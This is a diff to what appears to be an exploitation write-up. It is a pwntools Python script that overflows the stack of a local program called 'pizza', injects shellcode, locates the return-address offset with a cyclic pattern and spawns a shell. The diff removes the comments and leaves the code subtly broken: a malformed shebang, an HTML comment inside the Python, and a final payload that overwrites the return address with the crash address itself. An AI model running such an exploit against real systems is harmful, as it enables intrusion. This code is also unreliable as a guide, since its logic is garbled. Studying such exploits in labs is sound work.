@@ -32,30 +32,25 @@ Lastly, running the victim program "pizza" in GDB.
 ## python script using `pwntools` that executes the given program [pizza], leaks the stack offset, and spawns a shell.
 Below is a script in python to run the pizza program, getting the pizza program executable to crash (segfault), stack offset and spawning of the shell. 
 '''
-'#!/usr/bin/env python3
+!/usr/bin/env python3
 
 from pwn import *
 
-"Setting up context"
+<!-- Setting up context -->
 context.arch = 'amd64'
 context.os = 'linux'
 
-"Defining the targeted executable"
 binary = './pizza'
 
-"Define payload"
 offset = 72  # found via manual testing
 shellcode = asm(shellcraft.amd64.linux.sh())
 padding = b'A' * (offset - len(shellcode))
 payload = shellcode + padding + p64(0xdeadbeef)
 
-"Starting the pizza program"
 p = process(binary)
 
-"Sending payload"
 p.sendline(payload)
 
-"Getting RIP offset"
 pattern = cyclic(1000, n=8)
 p = process(binary)
 p.sendline(pattern)
@@ -64,14 +59,12 @@ core = p.corefile
 rip_offset = cyclic_find(core.rip, n=8)
 log.info(f'RIP offset: {rip_offset}')
 
-"Building final payload"
 padding = b'A' * rip_offset
 rip = p64(core.rip)
 payload = padding + rip + b'\n'
 p = process(binary)
 p.send(payload)
 
-"Interacting with shell"
 p.interactive()
 
 '''
